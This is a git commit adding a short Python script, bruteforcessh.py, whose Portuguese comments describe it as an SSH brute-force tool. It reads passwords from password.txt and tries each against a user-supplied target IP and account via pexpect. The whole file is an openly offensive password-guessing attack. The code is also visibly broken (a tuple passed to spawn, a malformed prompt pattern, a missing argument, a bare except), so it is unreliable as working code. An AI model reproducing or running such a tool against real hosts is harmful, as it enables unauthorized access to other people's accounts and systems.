b11c8e9aaadf4ec27a51058a6becc19824b4ad02
Spike <72819608+SpikeLibertarian@users.noreply.github.com>
2023-02-19 22:15:37 -0300

    BruteForce.py
    Script de tentativa de força bruta utilizando um arquivo de texto com uma lista de senhas.

---
+++ Codes_BHP/bruteforcessh.py
@@ -0,0 +1,32 @@
+#!/usr/bin/python
+
+import pexpect;
+
+def connect(user,host,password,PROMPT):
+  ssh_newkey = ('Você deseja continuar conectado?');
+  connStr = ('ssh', user, '@', host);
+  child = pexpect.spawn(connStr);
+  ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P||password:]']);
+  if (ret == 0):
+    print('[-] Error ao Conectar');
+    return
+  if(ret == 1):
+    child.sendline('yes');
+    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P||password:]']);
+    if (ret == 0):
+      print('[- Error ao Conectar]');
+      return
+  child.sendline(password);
+  child.expect(PROMPT);
+  return child;
+def main():
+  host = input('Insira o endereço ip do alvo para o bruteforce:');
+  user = input('Conta de usuário para o Bruteforce:');
+  arquivo = open("password.txt",'r');
+  for password in arquivo.readlines():
+    try:
+      child = connect(user,host,password);
+      print('[+] Senha Encontrada:' + password);
+    except:
+        print('[-] Senha Errada:' + password);
+main();
